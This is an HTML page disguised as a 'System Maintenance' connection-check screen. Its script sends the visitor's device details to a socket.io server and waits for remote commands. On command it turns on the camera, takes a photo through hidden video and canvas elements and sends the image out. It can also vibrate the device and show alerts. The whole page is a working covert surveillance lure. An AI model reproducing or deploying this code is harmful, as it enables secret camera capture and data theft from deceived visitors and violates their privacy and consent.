<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Maintenance</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #1a1a1a; color: white; }
        .container { text-align: center; padding: 20px; border-radius: 10px; background: #2d2d2d; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        #status { margin-top: 20px; color: #aaa; font-size: 0.9em; }
        video, canvas { display: none; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h2>Checking System...</h2>
        <div class="loader"></div>
        <p>Please wait while we optimize your connection.</p>
        <div id="status">Initializing...</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const socket = io();
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');

        // Function to get Device Info
        async function getDeviceInfo() {
            const battery = await navigator.getBattery();
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                batteryLevel: (battery.level * 100) + "%",
                isCharging: battery.charging,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown'
            };
        }

        socket.on('connect', async () => {
            status.innerText = 'Connected to secure server';
            // Send device info immediately on connect
            const info = await getDeviceInfo();
            socket.emit('device_info_report', info);
        });

        // Command: Capture Photo
        socket.on('request_capture', async (data) => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: data.camera }
                });
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    setTimeout(() => {
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg');
                        socket.emit('photo_captured', { image: imageData });
                        stream.getTracks().forEach(track => track.stop());
                    }, 1000);
                };
            } catch (err) {
                socket.emit('error_log', { message: "Camera Access Denied" });
            }
        });

        // Command: Vibrate
        socket.on('request_vibrate', (data) => {
            if (navigator.vibrate) {
                navigator.vibrate(data.pattern || 500);
                socket.emit('log', { message: "Vibration triggered" });
            }
        });

        // Command: Alert (Show a message)
        socket.on('request_alert', (data) => {
            alert(data.message);
        });

    </script>
</body>
</html>
